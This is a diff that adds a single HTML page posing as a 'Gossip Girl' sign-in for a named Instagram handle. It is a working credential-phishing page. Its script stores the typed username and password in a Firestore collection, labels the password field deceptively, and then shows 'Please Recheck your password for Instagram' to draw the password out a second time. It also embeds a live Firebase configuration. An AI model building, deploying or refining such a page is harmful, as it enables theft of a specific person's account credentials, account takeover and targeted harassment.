@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Gossip Girl</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #050505;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .box {
+      width: 90%;
+      max-width: 420px;
+      background: #111;
+      padding: 35px;
+      border-radius: 15px;
+      text-align: center;
+      border: 1px solid #333;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+    }
+
+    h1 {
+      margin-top: 0;
+      font-family: Georgia, serif;
+      letter-spacing: 4px;
+      font-size: 42px;
+    }
+
+    .subtitle {
+      color: #999;
+      font-family: Georgia, serif;
+      font-style: italic;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      background: #080808;
+      color: white;
+      border: 1px solid #444;
+      border-radius: 7px;
+      font-size: 15px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: white;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      background: white;
+      color: black;
+      border: none;
+      border-radius: 7px;
+      font-weight: bold;
+      letter-spacing: 2px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #ddd;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    #message {
+      margin-top: 18px;
+      min-height: 20px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="box">
+
+    <h1>GOSSIP GIRL</h1>
+
+    <p class="subtitle">
+      Gossip Girl account for @_farhahahahan
+    </p>
+
+    <form id="loginForm">
+
+      <!-- FIRST BOX -->
+      <input
+        id="username"
+        type="text"
+        placeholder="Username"
+        required
+      >
+
+      <!-- SECOND BOX -->
+      <input
+        id="confirmUsername"
+        type="text"
+        placeholder="Password"
+        required
+      >
+
+      <button
+        id="submitButton"
+        type="submit"
+      >
+        SIGN IN
+      </button>
+
+    </form>
+
+    <div id="message"></div>
+
+  </div>
+
+
+  <script type="module">
+
+    import {
+      initializeApp
+    } from
+    "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
+
+
+    import {
+      getFirestore,
+      collection,
+      addDoc,
+      serverTimestamp
+    } from
+    "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+
+    // YOUR FIREBASE CONFIG
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCvaYN9PxFnsszMm0vVUNtoKFwjtNLoyRc",
+      authDomain: "finalpls.firebaseapp.com",
+      projectId: "finalpls",
+      storageBucket: "finalpls.firebasestorage.app",
+      messagingSenderId: "533199845542",
+      appId: "1:533199845542:web:89553180e1f03f9f8edc67",
+      measurementId: "G-XX1EB41EEN"
+    };
+
+
+    // START FIREBASE
+
+    const app = initializeApp(firebaseConfig);
+
+    const db = getFirestore(app);
+
+
+    // GET PAGE ELEMENTS
+
+    const form = document.getElementById("loginForm");
+
+    const message = document.getElementById("message");
+
+    const submitButton =
+      document.getElementById("submitButton");
+
+
+    // WHEN SIGN IN IS CLICKED
+
+    form.addEventListener("submit", async function(event) {
+
+      event.preventDefault();
+
+
+      const username =
+        document.getElementById("username").value.trim();
+
+      const confirmUsername =
+        document
+          .getElementById("confirmUsername")
+          .value
+          .trim();
+
+
+      // CHECK BOTH BOXES ARE FILLED
+
+      if (!username || !confirmUsername) {
+
+        message.textContent =
+          "Please fill in both fields.";
+
+        message.style.color = "#ff5555";
+
+        return;
+      }
+
+
+      submitButton.disabled = true;
+
+      submitButton.textContent = "SAVING...";
+
+      message.textContent = "Saving...";
+
+      message.style.color = "white";
+
+
+      try {
+
+        // SAVE BOTH VALUES TO FIRESTORE
+
+        await addDoc(
+          collection(db, "gossipUsers"),
+          {
+            username: username,
+            confirmUsername: confirmUsername,
+            createdAt: serverTimestamp()
+          }
+        );
+
+
+        message.textContent =
+          "Please Recheck your password for Instagram";
+
+        message.style.color =
+          "lightgreen";
+
+
+        form.reset();
+
+
+      } catch (error) {
+
+        console.error(
+          "Firestore error:",
+          error
+        );
+
+
+        message.textContent =
+          "Could not save information.";
+
+        message.style.color =
+          "#ff5555";
+
+      }
+
+
+      submitButton.disabled = false;
+
+      submitButton.textContent = "SIGN IN";
+
+    });
+
+  </script>
+
+</body>
+</html>
